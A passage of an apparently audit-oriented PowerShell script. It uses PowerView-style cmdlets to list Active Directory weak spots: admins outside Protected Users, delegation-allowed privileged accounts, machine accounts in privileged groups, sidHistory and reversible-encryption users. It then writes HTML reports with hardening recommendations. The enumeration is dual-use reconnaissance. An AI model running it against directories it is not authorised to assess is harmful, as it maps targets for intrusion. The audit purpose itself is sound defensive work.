				#"Adm" = if ($NotProtectedNotSensitiveUser.memberof -match 'Administrators') { "YES" } else { "NO" }
				#"DA" = if ($NotProtectedNotSensitiveUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				#"EA" = if ($NotProtectedNotSensitiveUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $NotProtectedNotSensitiveUser.lastlogontimestamp
				"SID" = $NotProtectedNotSensitiveUser.objectSID
				"Domain" = $Domain
			}
		}
	}
	
	else {
		$TempAdminsNOTinProtectedUsersGroupAndNOTSensitive = foreach ($AllDomain in $AllDomains) {
			$dcName = "DC=" + $AllDomain.Split(".")
			$dcName = $dcName -replace " ", ",DC="
			$NotProtectedNotSensitiveUsers = Get-DomainUser -Domain $AllDomain -AllowDelegation -LDAPFilter "(&(AdminCount=1)(!(memberof=CN=Protected Users,CN=Users,$dcName)))"
			foreach ($NotProtectedNotSensitiveUser in $NotProtectedNotSensitiveUsers) {
				[PSCustomObject]@{
					"Account" = $NotProtectedNotSensitiveUser.samaccountname
					"Enabled" = if ($NotProtectedNotSensitiveUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($NotProtectedNotSensitiveUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $NotProtectedNotSensitiveUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $NotProtectedNotSensitiveUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $NotProtectedNotSensitiveUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($NotProtectedNotSensitiveUser.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($NotProtectedNotSensitiveUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($NotProtectedNotSensitiveUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $NotProtectedNotSensitiveUser.lastlogontimestamp
					"SID" = $NotProtectedNotSensitiveUser.objectSID
					"Domain" = $AllDomain
				}
			}
		}
	}

 	if ($TempAdminsNOTinProtectedUsersGroupAndNOTSensitive) {
		$TempAdminsNOTinProtectedUsersGroupAndNOTSensitive | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | Format-Table -AutoSize -Wrap
		$HTMLAdminsNOTinProtectedUsersGroupAndNOTSensitive = $TempAdminsNOTinProtectedUsersGroupAndNOTSensitive | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | ConvertTo-Html -Fragment -PreContent "<h2>Admin Users NOT in 'Protected Users' Group and NOT marked as 'sensitive and not allowed for delegation'</h2>"

  		$AdminsNOTinProtectedUsersGroupAndNOTSensitiveTable = [PSCustomObject]@{
			"Recommendations" = "Consider adding the identified Admin Users to the 'Protected Users' group or marking them as 'sensitive and not allowed for delegation' to enforce enhanced security measures such as restrictions on NTLM Authentication and Delegation."
		}
		
		$HTMLAdminsNOTinProtectedUsersGroupAndNOTSensitiveTable = $AdminsNOTinProtectedUsersGroupAndNOTSensitiveTable | ConvertTo-Html -As List -Fragment
  		$HTMLAdminsNOTinProtectedUsersGroupAndNOTSensitiveTable = $HTMLAdminsNOTinProtectedUsersGroupAndNOTSensitiveTable.Replace("*", "Recommendations")
	}
	
	######################################################################
    ########### Non Admin users in "Protected Users" group ###############
	######################################################################
	
	Write-Host ""
	Write-Host "Non-Admin Users in 'Protected Users' group:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$dcName = "DC=" + $Domain.Split(".")
		$dcName = $dcName -replace " ", ",DC="
		$ProtectedUsers = Get-DomainUser -Domain $Domain -Server $Server -LDAPFilter "(&(!(AdminCount=1))(memberof=CN=Protected Users,CN=Users,$dcName))"
		$TempNonAdminsInProtectedUsersGroup = foreach ($ProtectedUser in $ProtectedUsers) {
			[PSCustomObject]@{
				"Account" = $ProtectedUser.samaccountname
				"Enabled" = if ($ProtectedUser.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($ProtectedUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
    				"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $ProtectedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $ProtectedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $ProtectedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				#"Adm" = if ($ProtectedUser.memberof -match 'Administrators') { "YES" } else { "NO" }
				#"DA" = if ($ProtectedUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				#"EA" = if ($ProtectedUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $ProtectedUser.lastlogontimestamp
				"SID" = $ProtectedUser.objectSID
				"Domain" = $Domain
			}
		}

	}
	
	else {
		$TempNonAdminsInProtectedUsersGroup = foreach ($AllDomain in $AllDomains) {
			$dcName = "DC=" + $AllDomain.Split(".")
			$dcName = $dcName -replace " ", ",DC="
			$ProtectedUsers = Get-DomainUser -Domain $AllDomain -LDAPFilter "(&(!(AdminCount=1))(memberof=CN=Protected Users,CN=Users,$dcName))"
			foreach ($ProtectedUser in $ProtectedUsers) {
				[PSCustomObject]@{
					"Account" = $ProtectedUser.samaccountname
					"Enabled" = if ($ProtectedUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($ProtectedUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $ProtectedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $ProtectedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $ProtectedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($ProtectedUser.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($ProtectedUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($ProtectedUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $ProtectedUser.lastlogontimestamp
					"SID" = $ProtectedUser.objectSID
					"Domain" = $AllDomain
				}
			}
		}

	}

 	if ($TempNonAdminsInProtectedUsersGroup) {
		$TempNonAdminsInProtectedUsersGroup | Sort-Object Domain,Account | Format-Table -AutoSize -Wrap
		$HTMLNonAdminsInProtectedUsersGroup = $TempNonAdminsInProtectedUsersGroup | Sort-Object Domain,Account | ConvertTo-Html -Fragment -PreContent "<h2>Non-Admin Users in 'Protected Users' Group</h2>"
	}
	
	####################################################################
    ########### sensitive and not allowed for delegation ###############
	####################################################################
	
	Write-Host ""
	Write-Host "Privileged users marked as 'sensitive and not allowed for delegation':" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$PrivilegedUsers = Get-DomainUser -Domain $Domain -Server $Server -DisallowDelegation -AdminCount
		$TempPrivilegedSensitiveUsers = foreach ($PrivilegedUser in $PrivilegedUsers) {
			[PSCustomObject]@{
				"Account" = $PrivilegedUser.samaccountname
				"Enabled" = if ($PrivilegedUser.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($PrivilegedUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
    				"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $PrivilegedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $PrivilegedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $PrivilegedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				#"Adm" = if ($PrivilegedUser.memberof -match 'Administrators') { "YES" } else { "NO" }
				#"DA" = if ($PrivilegedUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				#"EA" = if ($PrivilegedUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $PrivilegedUser.lastlogontimestamp
				"SID" = $PrivilegedUser.objectSID
				"Domain" = $Domain
			}
		}
	}
	
	else {
		$TempPrivilegedSensitiveUsers = foreach ($AllDomain in $AllDomains) {
			$PrivilegedUsers = Get-DomainUser -Domain $AllDomain -DisallowDelegation -AdminCount
			foreach ($PrivilegedUser in $PrivilegedUsers) {
				[PSCustomObject]@{
					"Account" = $PrivilegedUser.samaccountname
					"Enabled" = if ($PrivilegedUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($PrivilegedUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $PrivilegedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $PrivilegedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $PrivilegedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($PrivilegedUser.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($PrivilegedUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($PrivilegedUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $PrivilegedUser.lastlogontimestamp
					"SID" = $PrivilegedUser.objectSID
					"Domain" = $AllDomain
				}
			}
		}
	}

 	if ($TempPrivilegedSensitiveUsers) {
		$TempPrivilegedSensitiveUsers | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | Format-Table -AutoSize -Wrap
		$HTMLPrivilegedSensitiveUsers = $TempPrivilegedSensitiveUsers | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | ConvertTo-Html -Fragment -PreContent "<h2>Privileged users marked as 'sensitive and not allowed for delegation'</h2>"
	}

	
	####################################################################
    ######## Not (sensitive and not allowed for delegation) ############
	####################################################################
    
    Write-Host ""
	Write-Host "Privileged users NOT marked as 'sensitive and not allowed for delegation':" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$PrivilegedUsers = Get-DomainUser -Domain $Domain -Server $Server -AllowDelegation -AdminCount
		$TempPrivilegedNotSensitiveUsers = foreach ($PrivilegedUser in $PrivilegedUsers) {
			[PSCustomObject]@{
				"Account" = $PrivilegedUser.samaccountname
				"Enabled" = if ($PrivilegedUser.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($PrivilegedUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
    				"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $PrivilegedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $PrivilegedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $PrivilegedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				#"Adm" = if ($PrivilegedUser.memberof -match 'Administrators') { "YES" } else { "NO" }
				#"DA" = if ($PrivilegedUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				#"EA" = if ($PrivilegedUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $PrivilegedUser.lastlogontimestamp
				"SID" = $PrivilegedUser.objectSID
				"Domain" = $Domain
			}
		}
	}
	
	else {
		$TempPrivilegedNotSensitiveUsers = foreach ($AllDomain in $AllDomains) {
			$PrivilegedUsers = Get-DomainUser -Domain $AllDomain -AllowDelegation -AdminCount
			foreach ($PrivilegedUser in $PrivilegedUsers) {
				[PSCustomObject]@{
					"Account" = $PrivilegedUser.samaccountname
					"Enabled" = if ($PrivilegedUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($PrivilegedUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $PrivilegedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $PrivilegedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $PrivilegedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($PrivilegedUser.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($PrivilegedUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($PrivilegedUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $PrivilegedUser.lastlogontimestamp
					"SID" = $PrivilegedUser.objectSID
					"Domain" = $AllDomain
				}
			}
		}
	}

 	if ($TempPrivilegedNotSensitiveUsers) {
		$TempPrivilegedNotSensitiveUsers | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | Format-Table -AutoSize -Wrap
		$HTMLPrivilegedNotSensitiveUsers = $TempPrivilegedNotSensitiveUsers | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | ConvertTo-Html -Fragment -PreContent "<h2>Privileged users NOT marked as 'sensitive and not allowed for delegation'</h2>"

  		$PrivilegedNOTSensitiveDelegationTable = [PSCustomObject]@{
			"Recommendations" = "Ensure that sensitive and critical accounts are marked as 'sensitive and not allowed for delegation' to enforce tighter control over credential delegation."
		}
		
		$HTMLPrivilegedNOTSensitiveDelegationTable = $PrivilegedNOTSensitiveDelegationTable | ConvertTo-Html -As List -Fragment
  		$HTMLPrivilegedNOTSensitiveDelegationTable = $HTMLPrivilegedNOTSensitiveDelegationTable.Replace("*", "Recommendations")
	}
	
	#############################################################################################
    ########### Non Privileged marked as sensitive and not allowed for delegation ###############
	#############################################################################################
	
	Write-Host ""
	Write-Host "Non-Privileged users marked as 'sensitive and not allowed for delegation':" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$PrivilegedUsers = Get-DomainUser -Domain $Domain -Server $Server -DisallowDelegation -LDAPFilter "(&(!(AdminCount=1)))"
		$TempNonPrivilegedSensitiveUsers = foreach ($PrivilegedUser in $PrivilegedUsers) {
			[PSCustomObject]@{
				"Account" = $PrivilegedUser.samaccountname
				"Enabled" = if ($PrivilegedUser.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($PrivilegedUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
    				"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $PrivilegedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $PrivilegedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $PrivilegedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				#"Adm" = if ($PrivilegedUser.memberof -match 'Administrators') { "YES" } else { "NO" }
				#"DA" = if ($PrivilegedUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				#"EA" = if ($PrivilegedUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $PrivilegedUser.lastlogontimestamp
				"SID" = $PrivilegedUser.objectSID
				"Domain" = $Domain
			}
		}

	}
	
	else {
		$TempNonPrivilegedSensitiveUsers = foreach ($AllDomain in $AllDomains) {
			$PrivilegedUsers = Get-DomainUser -Domain $AllDomain -DisallowDelegation -LDAPFilter "(&(!(AdminCount=1)))"
			foreach ($PrivilegedUser in $PrivilegedUsers) {
				[PSCustomObject]@{
					"Account" = $PrivilegedUser.samaccountname
					"Enabled" = if ($PrivilegedUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($PrivilegedUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $PrivilegedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $PrivilegedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $PrivilegedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($PrivilegedUser.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($PrivilegedUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($PrivilegedUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $PrivilegedUser.lastlogontimestamp
					"SID" = $PrivilegedUser.objectSID
					"Domain" = $AllDomain
				}
			}
		}
	}

 	if ($TempNonPrivilegedSensitiveUsers) {
		$TempNonPrivilegedSensitiveUsers | Sort-Object Domain,Account | Format-Table -AutoSize -Wrap
		$HTMLNonPrivilegedSensitiveUsers = $TempNonPrivilegedSensitiveUsers | Sort-Object Domain,Account | ConvertTo-Html -Fragment -PreContent "<h2>Non-Privileged users marked as 'sensitive and not allowed for delegation'</h2>"
	}
	
	####################################################################
    ########### Machine Accounts in Privileged Groups) #################
	####################################################################
	
	Write-Host ""
    Write-Host "Machine accounts in privileged groups:" -ForegroundColor Cyan
    if ($Domain -and $Server) {
		$MachinePrivGroupMembers = Get-DomainGroup -Domain $Domain -Server $Server -AdminCount | Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse | Where-Object { $_.MemberName -like '*$' } | Sort-Object -Unique
		$TempMachineAccountsPriv = foreach ($GroupMember in $MachinePrivGroupMembers) {
			$DomainComputerGroupMember = Get-DomainComputer -Identity $GroupMember.MemberName.TrimEnd('$') -Domain $Domain -Server $Server
			[PSCustomObject]@{
				"Member" = $GroupMember.MemberName
				"Enabled" = if ($GroupMember.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($DomainComputerGroupMember.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
				"IP Address" = Resolve-DnsName -Name ($GroupMember.MemberName.TrimEnd('$')) -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
				"Member SID" = $GroupMember.MemberSID
				"Operating System" = $DomainComputerGroupMember.operatingsystem
				"Member Domain" = $GroupMember.MemberDomain
				"Privileged Group" = $GroupMember.GroupName
				"Group Domain" = $GroupMember.GroupDomain
			}
		}
	}
	
	else {
		$TempMachineAccountsPriv = foreach ($AllDomain in $AllDomains) {
			$Server = Get-DomainController -Domain $AllDomain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
			$MachinePrivGroupMembers = Get-DomainGroup -Domain $AllDomain -AdminCount | Get-DomainGroupMember -Recurse | Where-Object { $_.MemberName -like '*$' } | Sort-Object -Unique
			foreach ($GroupMember in $MachinePrivGroupMembers) {
				$DomainComputerGroupMember = Get-DomainComputer -Identity $GroupMember.MemberName.TrimEnd('$') -Domain $AllDomain
				[PSCustomObject]@{
					"Member" = $GroupMember.MemberName
					"Enabled" = if ($GroupMember.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($DomainComputerGroupMember.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = Resolve-DnsName -Name ($GroupMember.MemberName.TrimEnd('$')) -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
					"Member SID" = $GroupMember.MemberSID
					"Operating System" = $DomainComputerGroupMember.operatingsystem
					"Member Domain" = $GroupMember.MemberDomain
					"Privileged Group" = $GroupMember.GroupName
					"Group Domain" = $GroupMember.GroupDomain
				}
			}
		}
	}

 	if ($TempMachineAccountsPriv) {
		$TempMachineAccountsPriv | Sort-Object "Group Domain",Member | Format-Table -AutoSize -Wrap
		$HTMLMachineAccountsPriv = $TempMachineAccountsPriv | Sort-Object "Group Domain",Member | ConvertTo-Html -Fragment -PreContent "<h2>Machine accounts in privileged groups</h2>"

  		$MachineAccountsPrivilegedGroupsTable = [PSCustomObject]@{
			"Recommendations" = "Evaluate the necessity of the identified computer objects' membership in the privileged group and consider removing them if their inclusion is not essential for their intended purpose."
		}
		
		$HTMLMachineAccountsPrivilegedGroupsTable = $MachineAccountsPrivilegedGroupsTable | ConvertTo-Html -As List -Fragment
  		$HTMLMachineAccountsPrivilegedGroupsTable = $HTMLMachineAccountsPrivilegedGroupsTable.Replace("*", "Recommendations")
	}
	
	##########################################
    ########### sidHistory set ###############
	##########################################

    Write-Host ""
	Write-Host "Users with sidHistory set:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$sidHistoryUsers = Get-DomainUser -Domain $Domain -Server $Server -LDAPFilter '(sidHistory=*)'
		$TempsidHistoryUsers = foreach ($sidHistoryUser in $sidHistoryUsers) {
			[PSCustomObject]@{
				"User Name" = $sidHistoryUser.samaccountname
				"Enabled" = if ($sidHistoryUser.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($sidHistoryUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
    				"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $sidHistoryUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $sidHistoryUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $sidHistoryUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				#"Adm" = if ($sidHistoryUser.memberof -match 'Administrators') { "YES" } else { "NO" }
				#"DA" = if ($sidHistoryUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				#"EA" = if ($sidHistoryUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $sidHistoryUser.lastlogontimestamp
				"SID" = $sidHistoryUser.objectSID
				"Domain" = $Domain
			}
		}
	}
	
	else {
		$TempsidHistoryUsers = foreach ($AllDomain in $AllDomains) {
			$sidHistoryUsers = Get-DomainUser -Domain $AllDomain -LDAPFilter '(sidHistory=*)'
			foreach ($sidHistoryUser in $sidHistoryUsers) {
				[PSCustomObject]@{
					"User Name" = $sidHistoryUser.samaccountname
					"Enabled" = if ($sidHistoryUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($sidHistoryUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $sidHistoryUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $sidHistoryUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $sidHistoryUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($sidHistoryUser.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($sidHistoryUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($sidHistoryUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $sidHistoryUser.lastlogontimestamp
					"SID" = $sidHistoryUser.objectSID
					"Domain" = $AllDomain
				}
			}
		}
	}

 	if ($TempsidHistoryUsers) {
		$TempsidHistoryUsers | Sort-Object Domain,"User Name" | Format-Table -AutoSize -Wrap
		$HTMLsidHistoryUsers = $TempsidHistoryUsers | Sort-Object Domain,"User Name" | ConvertTo-Html -Fragment -PreContent "<h2>Users with sidHistory set</h2>"

  		$SDIHistorysetTable = [PSCustomObject]@{
			"Recommendations" = "Assess if there are valid reasons for the identified accounts to have the 'sidHistory' attribute set, and consider removing it to mitigate potential security risks."
		}
		
		$HTMLSDIHistorysetTable = $SDIHistorysetTable | ConvertTo-Html -As List -Fragment
  		$HTMLSDIHistorysetTable = $HTMLSDIHistorysetTable.Replace("*", "Recommendations")
  		
	}
	
	##################################################
    ########### Reversible Encryption ################
	##################################################
	
	Write-Host ""
	Write-Host "Users with Reversible Encryption:" -ForegroundColor Cyan

	if ($Domain -and $Server) {
		
		$RevEncUsers = Get-DomainUser -Domain $Domain -Server $Server -LDAPFilter "(&(objectCategory=User)(userAccountControl:1.2.840.113556.1.4.803:=128))"
		
		$TempRevEncUsers = foreach ($RevEncUser in $RevEncUsers) {
			[PSCustomObject]@{
					"Name" = $RevEncUser.samaccountname
					"Enabled" = if ($RevEncUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($RevEncUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $RevEncUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $RevEncUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $RevEncUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($RevEncUser.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($RevEncUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($RevEncUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $RevEncUser.lastlogontimestamp
					"Object SID" = $RevEncUser.objectsid
					"Domain" = $Domain
					#"Description" = $RevEncUser.description
			}
		}
	}
	
	else{
		
		$TempRevEncUsers = foreach ($AllDomain in $AllDomains) {
			$RevEncUsers = Get-DomainUser -Domain $AllDomain -LDAPFilter "(&(objectCategory=User)(userAccountControl:1.2.840.113556.1.4.803:=128))"
			
			foreach ($RevEncUser in $RevEncUsers) {
				[PSCustomObject]@{
					"Name" = $RevEncUser.samaccountname
					"Enabled" = if ($RevEncUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($RevEncUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $RevEncUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $RevEncUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $RevEncUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($RevEncUser.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($RevEncUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($RevEncUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $RevEncUser.lastlogontimestamp
					"Object SID" = $RevEncUser.objectsid
					"Domain" = $AllDomain
					#"Description" = $RevEncUser.description
				}
			}
		}
	}

 	if ($TempRevEncUsers | Where-Object {$_.Name -ne $null}) {
		$TempRevEncUsers | Where-Object {$_.Name -ne $null} | Sort-Object Domain,Name | Format-Table -AutoSize
		$HTMLRevEncUsers = $TempRevEncUsers | Where-Object {$_.Name -ne $null} | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2>Users with Reversible Encryption</h2>"

  		$ReversibleEncryptionTable = [PSCustomObject]@{
			"Recommendations" = "Review and disable Reversible Encryption for every account identified, then force a password change to ensure that passwords are securely hashed."
		}
		
		$HTMLReversibleEncryptionTable = $ReversibleEncryptionTable | ConvertTo-Html -As List -Fragment
  		$HTMLReversibleEncryptionTable = $HTMLReversibleEncryptionTable.Replace("*", "Recommendations")
	}

 	#############################################
    ######### DA Name Correlation ###############
	#############################################
	
	Write-Host ""
	Write-Host "Linked DA accounts using name correlation:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$LinkedDAAccounts = Get-DomainGroupMember 'Domain Admins' -Domain $Domain -Server $Server | ForEach-Object {
			$user = Get-DomainUser $_.membername -Domain $Domain -Server $Server -LDAPFilter '(displayname=*)'
			$nameParts = $user.displayname.split(' ')[0..1] -join ' '
			$linkedAccounts = Get-DomainUser -Domain $Domain -Server $Server -LDAPFilter "(displayname=*$nameParts*)"
			foreach ($account in $linkedAccounts) {
				[PSCustomObject]@{
					"Account" = $account.samaccountname
					"Display Name" = $account.displayname
					"Enabled" = if ($account.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($account.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($account.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($account.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($account.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $account.lastlogontimestamp
					"SID" = $account.objectSID
					"Domain" = $Domain
				}
			}
		}
	}
	else {
		$LinkedDAAccounts = foreach ($AllDomain in $AllDomains) {
			$members = Get-DomainGroupMember 'Domain Admins' -Domain $AllDomain
			foreach ($member in $members) {
				$user = Get-DomainUser $member.membername -LDAPFilter '(displayname=*)'
				$nameParts = $user.displayname.split(' ')[0..1] -join ' '
